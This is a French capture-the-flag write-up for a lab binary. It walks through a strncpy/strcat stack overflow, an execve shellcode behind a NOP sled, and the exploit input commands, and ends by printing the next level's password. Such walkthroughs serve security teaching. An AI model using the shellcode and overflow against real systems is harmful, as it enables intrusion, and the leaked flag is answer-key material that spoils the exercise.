@@ -1,0 +1,164 @@
+On a donc un programme, qui nous propose d'écrire deux chaines de caractere, puis les concatène avant de les afficher.
+
+En regardant dans gdb, on trouve 3 fonctions :
+(gdb) info functions
+0x080484b4  p
+0x0804851e  pp
+0x080485a4  main
+
+la fonction main appelle pp.
+On voit dans la fonction pp plusieurs choses :
+- Elle appelle deux fois la fonction p
+- elle utilise un strcpy
+- puis un strcat
+
+La fonction p, elle:
+- utilise un read
+- un strchr
+- un strncpy.
+
+La seule exploitation que l'on voit possible est donc le strcpy de pp, puisque dans p, le strncpy va limiter la copie à 0x14 octets (20 octets)
+
+Essayons de provoquer un segfault
+(gdb) run 
+Starting program: /home/user/bonus0/bonus0 
+ - 
+AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMM
+ - 
+aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmm
+AAAABBBBCCCCDDDDEEEEaaaabbbbccccddddeeee��� aaaabbbbccccddddeeee���
+
+Program received signal SIGSEGV, Segmentation fault.
+0x64636363 in ?? ()
+
+On a bien un segfault, qui intervient à 0x64636363 (c'est a dire au niveau de "dccc", ou en little endian "cccd"),
+on peut donc comprendre que l'offset se trouve après la 9e position du second input.
+On remarque aussi que le premier input n'a pas été réecrit en entier, en effet, le premier input est protégé par 
+   0x08048585 <+103>:	movzwl (%ebx),%edx
+qui ajoute un '\0' à la fin de la string, ce qui n'est pas fait pour le deuxieme input qui passe par strncpy.
+Or strncpy copie les n octets qui lui sont donnés. S'il n'y a pas de '\0' à la fin des n octets, il ne va pas en ajouter.
+De ce fait, lorsque dans pp, on va concatener cette seconde string à la premiere, il va prendre tous les octets jusqu'a trouver un '\0', et comme il n'y en a pas, cela va déborder.
+
+en regardant dans les registre:
+(gdb) info registers
+    eax            0x0	0
+ecx            0xffffffff	-1
+edx            0xb7fd28b8	-1208145736
+ebx            0xb7fd0ff4	-1208152076
+esp            0xbffff730	0xbffff730
+ebp            0x63626262	0x63626262
+esi            0x0	0
+edi            0x0	0
+eip            0x64636363	0x64636363
+
+On voit que c'est bien l'eip, le trackeur d'instructions qui est override. Il faut donc lui indiquer une addresse qui contienne un system(/bin/sh).
+Le problème, c'est que le buffer disponible n'est pas assez grand pour contenir un shell code.
+Il faut donc qu'on introduise le shell code dans le programme d'une autre manière :
+les variable d'environnement sont introduites au lancement du code :
+
+$ export AAA=`python -c 'print 500 * "A"'`
+$ gdb bonus0
+(gdb) b main
+(gdb) run 
+Breakpoint
+(gdb)  x/20s *((char **)environ)
+0xbffff641:	 "AAA=", 'A' <repeats 196 times>...
+
+On peut ainsi retrouver l'addresse où se trouve nos variable d'environnement ! 
+Le problème c'est que on ne peut savoir l'addresse qu'une fois qu'on a lancé le programme, on ne peut pas vraiment prévoir exactement où sera stocker la variable,
+car elle aura une place différente à chaque lancement. Mais elle aura une place sensiblement proche de celle qu'on a trouvé.
+Pour remedier à ça, on va utiliser "\x90" qui est un NOPSLED addresse, ou un NOP, qui signifie "no operation".
+Plus simplement, quand le processeur rencontre cette instruction, il ne va rien faire et passer à la suivante, ainsi de suite jusqu'à trouver une instruction a executer.
+
+On va donc faire précéder notre SHELLCODE de NOP, pour faire passer le processus dessus jusqu'au shellcode.
+Plus le nombre de NOP sera grand, moins on court le risque de donner une addresse qui est en fait occupé par une autre variable d'environnement.
+
+$ export NOPSHELLCODE=`python -c 'print 1000 * "\x90" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"'`
+$ gdb bonus0
+(gdb) b main
+(gdb) run
+Breakpoint
+(gdb) x/20s *((char **)environ)
+    0xbffffb2d:	 "NOPSHELCODE=\220\220\220\220\220\220\220\220\220\220\220\220..."
+
+On a l'addresse du début de notre variable d'environnement pour le lancement actuelle. Mais on ne va pas prendre le début,
+car peut être qu'au prochain lancement, elle comencera une addresse plus loin, et dans ce cas, lorsqu'on donnera cette addresse comme return addresse, elle ne sera pas sur un NOP, et fera un segfault.
+On a mis préalablement 1000 NOP au début de notre variable d'environnement. Prenons l'addresse au milieu de ces 1000 NOP, donc 0xbffffb2d + 500 = 0xbffffd21
+
+On vérifie qu'on est bien toujours dans notre variable :
+(gdb) x/200wx 0xbffffd21
+    0xbffffd21:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffffd31:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffffd41:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffffd51:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffffd61:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffffd71:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffffd81:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffffd91:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffffda1:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffffdb1:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffffdc1:	0x90909090	0x90909090	0x90909090	0x90909090
+
+C'est bon, il y a bien encore beaucoup de NOP après cette addresse.
+
+On va donc lancer notre programme
+On a encore le problème de donner l'addresse depuis l'input. Il faut donner 2 arguments dans un fichier.
+Pour cela, il faut avoir un retour chariot dans la string du premier argument:
+(gdb) disas p
+    ...
+       0x080484e6 <+50>:	movl   $0xa,0x4(%esp)      -> 0xa = 10 = "\n" en ascii
+   0x080484ee <+58>:	lea    -0x1008(%ebp),%eax
+   0x080484f4 <+64>:	mov    %eax,(%esp)
+   0x080484f7 <+67>:	call   0x80483d0 <strchr@plt>   -> cherche \n dans la string
+    ...
+Et aussi remplir entièrement le premier argument, car cela fermera le premier read.
+Donc on va remplir entièrement le buffer qui mesure 4096 octets:
+       0x080484c8 <+20>:	movl   $0x1000,0x8(%esp)  -> 0x1000 = 4096
+   0x080484d0 <+28>:	lea    -0x1008(%ebp),%eax
+   0x080484d6 <+34>:	mov    %eax,0x4(%esp)
+   0x080484da <+38>:	movl   $0x0,(%esp)
+   0x080484e1 <+45>:	call   0x8048380 <read@plt>
+et on va le finir par un \n 
+
+Ensuite on va commencer le deuxième argument, on sait que le programme crash après 9 octets du deuxièeme argument,
+on va donc remplir le buffer de 9 octets avant de mettre l'addresse de notre variable d'environnement.
+
+$ python -c 'print 4095 * "A" + "\n" + 9 * "A" + "\xbf\xff\xfd\x21"[::-1]' > /tmp/myExploit
+$ cat /tmp/myExploit - | ./bonus0
+ - 
+ - 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAA!���AAAAAAA��� AAAAAAAAA!���AAAAAAA���
+$
+
+Cela ne fonctionne pas, il n' y a d'ailleurs pas de segfault, ce qui montre que notre string semble trop courte pour provoquer un overflow.
+Regardons dans gdb :
+(gdb) b *0x80485cb      (-> au niveau du dernier return du programme)
+(gdb) run < /tmp/myExploit
+Breakpoint
+(gdb) x/4wx $sp
+    0xbffff31c:	0xb7e454d3	0x00000001	0xbffff3b4	0xbffff3bc
+
+En effet on ne retrouve pas notre addresse de variable d'environnement.
+Essayons d'ajouter des octets à notre second argument pour provoquer l'overflow:
+$ python -c 'print 4095 * "A" + "\n" + 9 * "A" + "\xbf\xff\xfd\x21"[::-1] + 8 * "A"' > /tmp/myExploit
+(gdb) b *0x80485cb
+(gdb) run < /tmp/myExploit
+(gdb) x/4wx $sp
+    0xbffff31c:	0xbffffdad	0x41414141	0xf4414141	0x00b7fd0f
+
+Bingo !
+
+resume :
+$ export NOPSHELLCODE=`python -c 'print 1000 * "\x90" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"'`
+
+Check addresse et choisir au milieu des nop.
+
+$ python -c 'print 4095 * "A" + "\n" + 9 * "A" + "\xbf\xff\xfd\x21"[::-1] + 8 * "A"' > /tmp/myExploit
+$ cat /tmp/myExploit - | ./bonus0
+ - 
+ - 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAA!���AAAAAAA��� AAAAAAAAA!���AAAAAAA���
+whoami
+bonus1
+cat /home/user/bonus1/.pass
+cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
